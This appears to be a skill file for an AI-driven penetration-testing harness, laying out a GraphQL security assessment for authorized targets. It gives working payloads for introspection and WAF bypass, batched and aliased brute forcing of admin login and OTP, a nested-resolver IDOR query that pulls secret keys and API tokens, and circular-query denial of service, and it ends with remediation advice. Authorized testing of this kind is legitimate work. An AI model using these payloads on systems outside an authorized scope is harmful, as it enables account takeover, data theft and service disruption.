---
name: web-graphql-introspection-bypass
description: GraphQL security assessment, introspection query filter bypasses, field suggestion enumeration, query batching attacks, circular query complexity DoS, and nested resolver IDOR.
---

# GraphQL Security Assessment & Introspection Abuse

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified GraphQL API endpoints (`/graphql`, `/api/graphql`, `/v1/graphql`, `/query`) in `.hacker-harness/scope.yaml`.
- **Target Credentials:** Low-privilege Bearer token or cookie session.
- **Traffic Routing:** Route GraphQL queries and mutations through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Introspection Discovery & Obfuscation Bypasses
Probe standard introspection query:
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name kind } }
      }
    }
  }
}
```
If disabled or blocked by WAF/Gateway:
1. **Case & Whitespace Mutations:**
   `query { __Schema { types { name } } }`
   `query { __schema \n { types { name } } }`
2. **GET vs. POST Method Switching:**
   `GET /graphql?query={__schema{types{name}}}`
   `POST /graphql with Content-Type: application/x-www-form-urlencoded`
3. **Field Suggestion Enumeration (Clairvoyance):**
   If introspection is completely disabled, send erroneous field names (`query { usr }`) and parse suggestions in error response:
   *`"Did you mean 'user', 'users', or 'userProfile'?"`*

### Step 2: Query Batching & Rate-Limit Bypasses
Bypass brute-force rate limits on login/OTP endpoints by grouping multiple operations:
```json
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]
```
Alternatively, using Aliases in a single query:
```graphql
mutation {
  a1: login(user: "admin", code: "1001") { token }
  a2: login(user: "admin", code: "1002") { token }
  a3: login(user: "admin", code: "1003") { token }
}
```

### Step 3: Nested Resolver IDOR / BOLA
Check if sub-object resolvers skip top-level authorization checks:
```graphql
query {
  me {
    id
    organization {
      id
      # Access another user's project by injecting foreign ID
      projects(id: "project_foreign_123") {
        id
        secretKey
        apiTokens
      }
    }
  }
}
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| GraphQL Context | Vulnerability Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Introspection Exposes Internal Admin Mutations** | Schema contains unlisted debug mutations | `mutation { debugResetPassword(userId: 1) }` | Password reset without current credentials |
| **Alias Batching OTP Bypass** | Single HTTP request executes 1,000 OTP guesses | Alias dictionary mutation (`try0001: verify(otp: "0001")`) | Valid session token returned for matching alias |
| **Circular Query Complexity** | Recursive relational fields without depth limit | `query { user { posts { author { posts { author { ... } } } } } }` | High CPU utilization / Server 504 timeout |
| **Private Field Exposure via Type Extension** | User type contains hidden fields | `query { user(id: 5) { id email ssn role passwordHash } }` | Sensitive PII fields returned in JSON |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture GraphQL query payload and HTTP response showing extracted schema elements or unauthorized object data.
2. **Impact Proof:** Verify field authorization and object boundary enforcement without executing denial-of-service query recursion.
3. **Remediation:** Disable schema introspection in production, disable query batching and field suggestions, enforce maximum query depth and complexity limits, and validate object ownership at every resolver layer.
